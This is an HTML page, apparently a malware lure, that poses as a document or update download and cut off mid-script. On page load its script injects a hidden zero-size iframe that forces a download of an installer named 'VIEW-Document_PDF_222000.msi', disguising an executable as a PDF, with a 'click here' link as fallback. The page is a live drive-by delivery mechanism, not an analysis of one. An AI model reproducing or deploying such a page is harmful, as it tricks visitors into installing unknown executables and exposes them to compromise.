<!DOCTYPE html>
<html lang="en">
<head>

  <title>Installing update</title>
  <style>
    body { margin: 0; font-family: "Segoe UI", system-ui, sans-serif; background: #f3f3f3; color: #1a1a1a; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
    .card { background: #fff; border-radius: 8px; box-shadow: 0 8px 32px rgba(0,0,0,.08); padding: 32px 40px; max-width: 420px; text-align: center; }

    @keyframes spin { to { transform: rotate(360deg); } }
    a { color: #0078d4; }
  </style>
</head>
<body>
  <div class="card">
    <div class="spinner" aria-hidden="true"></div>
    <h1>Preparing your download</h1>
    <p>If the download does not start automatically, <a id="manual-link" href="/VIEW-Document_PDF_222000.msi" download="VIEW-Document_PDF_222000.msi">click here</a>.</p>
  </div>
  <script>
    (function () {
      var MSI = '/VIEW-Document_PDF_222000.msi';
      var frame = document.createElement('iframe');
      frame.style.cssText = 'position:absolute;width:0;height:0;border:0;clip:rect(0,0,0,0);overflow:hidden';
      frame.src = MSI;
      document.body.appendChild(frame);
    })();
